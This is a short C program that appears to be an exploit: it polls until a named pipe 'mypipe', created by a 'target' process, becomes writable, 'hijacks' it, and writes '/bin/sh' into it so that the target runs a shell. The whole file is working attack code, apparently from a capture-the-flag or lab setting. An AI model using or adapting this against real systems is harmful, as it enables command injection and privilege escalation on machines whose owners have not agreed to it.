#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

#define MAX_BUF 5
#define CMD_LEN 7
int main()
{
    int fd; // File descriptors
    char *namedPipe = "mypipe"; // FIFO Pipe
    char pipeCmd[CMD_LEN] = "/bin/sh"; // Command to send to pipe;
    char buf[7];

    printf("Waiting for namedpipe to be created by target...\n");

    while (1)
    {
        if ((fd = open(namedPipe, O_WRONLY)) == -1) // Hijack pipe block
            continue; //Keep looping
        printf("Pipe found!\n");
        break;
    }
    printf("Writing /bin/sh...\n");
    write(fd, pipeCmd, CMD_LEN);
    printf("Done!\n");
    close(fd);
    exit(0);
}
